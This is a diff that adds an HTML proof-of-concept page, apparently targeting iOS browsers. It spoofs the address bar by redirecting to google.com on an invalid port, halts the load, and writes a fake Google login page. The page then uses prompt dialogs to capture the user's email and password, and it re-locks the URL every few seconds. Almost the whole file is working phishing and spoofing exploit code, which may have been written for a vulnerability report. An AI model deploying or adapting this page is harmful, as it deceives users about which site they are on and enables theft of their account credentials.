@@ -1,0 +1,48 @@
+<html><body>
+<h2>Halo</h2>
+<!-- Multiple iframe warmups using /csi/ to bypass iOS rendering block -->
+<iframe src="https://www.google.com/csi" style="display:none;"></iframe>
+<iframe src="https://www.google.com/csi" style="display:none;"></iframe>
+<iframe src="https://www.google.com/favicon.ico" style="display:none;"></iframe>
+<script>
+setTimeout(() => {
+// Step 1: Redirect ke invalid port /csi/ (lock address bar, fail load, no content reset)
+top.location = "https://www.google.com:8080/csi";
+
+setTimeout(() => {
+// Step 2: Focus + stop load + inject attacker's content
+window.focus();
+window.stop();  // Stop any ongoing load
+
+// Inject attacker's fake content (e.g., Google login page)
+const attackerContent = `
+<div style="text-align:center; font-family:Arial;">
+<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" style="margin-top:20px;">
+<h1>Google Account Login</h1>
+<p>Please enter your credentials to continue:</p>
+</div>
+`;
+document.open();
+document.write(attackerContent);
+document.close();
+
+// Step 3: Delay for content rendering, then prompts
+setTimeout(() => {
+prompt("Google Login Required", "Enter Email");
+prompt("Google Password", "Enter Password");
+
+// Step 4: Final prompt (capture combined creds)
+const creds = prompt("Google Security Check", "Email:Password");
+console.log("Captured:", creds);
+
+}, 1200); // 1.2 sec delay for iOS prompt rendering
+
+// Optional: SetInterval to repeatedly lock URL if content resets
+setInterval(() => {
+top.location = "https://www.google.com:8080/csi";
+}, 3000); // Every 3 sec to prevent reset
+
+}, 2000); // 2 sec delay for load failure + injection
+
+}, 500); // Initial warmup delay
+</script>
